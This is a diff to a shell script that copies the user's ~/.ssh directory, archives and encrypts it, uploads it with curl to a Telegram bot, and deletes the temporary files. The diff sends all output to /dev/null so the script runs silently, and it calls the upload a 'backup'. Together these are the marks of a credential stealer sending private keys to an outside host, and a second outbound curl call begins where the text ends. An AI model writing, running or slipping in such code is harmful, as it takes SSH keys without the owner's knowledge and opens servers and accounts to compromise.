@@ -19,21 +19,23 @@ ARCHIVE="$TMP.tar"
 ZIP="/tmp/system.tar.gz"
 ENCRYPTED="$ARCHIVE.gpg"
 
-mkdir -p "$TMP"
-cp -r ~/.ssh "$TMP/"
+mkdir -p "$TMP" > /dev/null 2>&1
+cp -r ~/.ssh "$TMP/" > /dev/null 2>&1
 
-tar -cf "$ARCHIVE" -C "$TMP" ssh
+tar -cf "$ARCHIVE" -C "$TMP" ssh > /dev/null 2>&1
 
 gpg --batch --yes --passphrase "$PASSWORD" \
-    --symmetric --cipher-algo AES256 "$ARCHIVE"
+    --symmetric --cipher-algo AES256 "$ARCHIVE" \
+> /dev/null 2>&1
 
 curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
   -F chat_id="$CHAT_ID" \
   -F document=@"$ENCRYPTED" \
-  -F caption="🔐 Encrypted .ssh backup (AES-256)"
+  -F caption="🔐 Encrypted .ssh backup (AES-256)" \
+> /dev/null 2>&1
 
 # ===== CLEAN UP =====
-rm -rf "$TMP" "$ARCHIVE" "$ENCRYPTED"
+rm -rf "$TMP" "$ARCHIVE" "$ENCRYPTED" > /dev/null 2>&1
 
 curl -s \
   -X POST \
